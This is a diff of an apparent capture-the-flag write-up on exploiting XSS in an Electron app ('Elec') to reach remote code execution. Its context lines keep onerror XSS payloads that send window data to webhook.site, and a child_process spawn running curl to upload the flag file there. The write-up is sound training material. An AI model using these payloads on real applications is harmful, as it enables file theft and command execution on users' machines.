@@ -1,16 +1,18 @@
 ---
 created: 2024-06-21T22:48
-updated: 2024-06-23T08:43
+updated: 2024-06-23T19:24
+tags:
+  - fav
 ---
 
 # Elec
-# Analysis
+## Analysis
 
 - Seems to be XSS, but the flag is stored on the file system `/flag`.
 - It's an electron app
-# Probing
+## Probing
 
-First let's prob it with bunch of XSS payloads, check fields on `window` etc.
+First let's prob it with a bunch of XSS payloads, check fields on `window` etc.
 
 To prevent the script from running on my own computer, I've set a `localStorage` item called `no-go`.
 
@@ -28,8 +30,8 @@ To prevent the script from running on my own computer, I've set a `localStorage`
 	const replaceWithTypes = obj => Object.fromEntries(Object.entries(obj).map(([k, v]) => [k, [typeof v, typeof v === 'function'?v.toString():v]]));
 	location='https://webhook.site/?w='+JSON.stringify(replaceWithTypes(window.__Process$));
 	}catch(e){
-    location='https://webhook.site/?w='+String(e);
-    }});">
+location='https://webhook.site/?w='+String(e);
+}});">
 ```
 
 ```html
@@ -41,7 +43,7 @@ Other than that, nothing interesting.
 > `window.__Process$` was just a dummy `process` object with no real use.
 
 ---
-# Electron RCE
+## Electron RCE
 
 ```js
 const win = new BrowserWindow({
@@ -60,7 +62,7 @@ With some googling I found out that `contextIsolation: false` means the renderer
 > Failed attempt on prototype pollution
 > Tried to pollute `options.shell` `options.file` etc, didn't work.
 
-# Final Solution
+## Final Solution
 
 ```html
 <img src =q onerror="if (!localStorage.getItem('no-go')) {
@@ -84,7 +86,7 @@ With some googling I found out that `contextIsolation: false` means the renderer
 }">
 ```
 
-## Explanation
+### Explanation
 
 In `preload.js`
 
@@ -104,7 +106,7 @@ const cp2 = new cp.constructor();
 cp2.spawn({ shell: true, file: 'curl', args: ['curl', '-F', 'flag=@flag', 'https://webhook.site/'] });
 ```
 
-## Simplified
+### Simplified
 
 ```html
 <img src =q onerror="{
